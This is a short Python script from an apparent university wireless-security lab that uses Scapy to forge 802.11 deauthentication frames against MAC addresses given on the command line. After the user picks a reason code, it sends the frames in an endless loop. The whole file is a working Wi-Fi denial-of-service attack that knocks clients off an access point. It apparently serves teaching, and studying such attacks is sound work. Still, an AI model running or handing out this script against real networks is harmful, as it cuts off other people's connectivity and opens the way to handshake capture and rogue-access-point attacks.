# SWI - Labo1-MAC1
# Date: 28.02.2020
# File: deauthentication.py
# Students: Stefan Dejanovic, Nathanael Mizutani

# source : https://www.shellvoide.com/python/forge-and-transmit-de-authentication-packets-over-the-air-in-scapy/
# -*- coding: utf-8 -*-

from scapy.all import *

print("##########################################")
print("#       DEAUTHENTIFICATION FRAME         #")
print("###########################################")
print("1 - Unspecified")
print("4 - Disassociated due to inactivity")
print("5 - Disassociated because AP is unable to handle all currently associated stations")
print("8 - Deauthenticated because sending STA is leaving BSS")

# Get input informations (reason, addr1, addr2, addr3)
reason = input("Choose one of the 4 reasons:")

print()

# Define the deauthification
pkt = RadioTap() / Dot11(addr1=sys.argv[1], addr2=sys.argv[2], addr3=sys.argv[2]) / Dot11Deauth(int(reason))

# Send the deauthification
while True:
    sendp(pkt, iface="wlx00c0ca6aac0a", verbose=False)
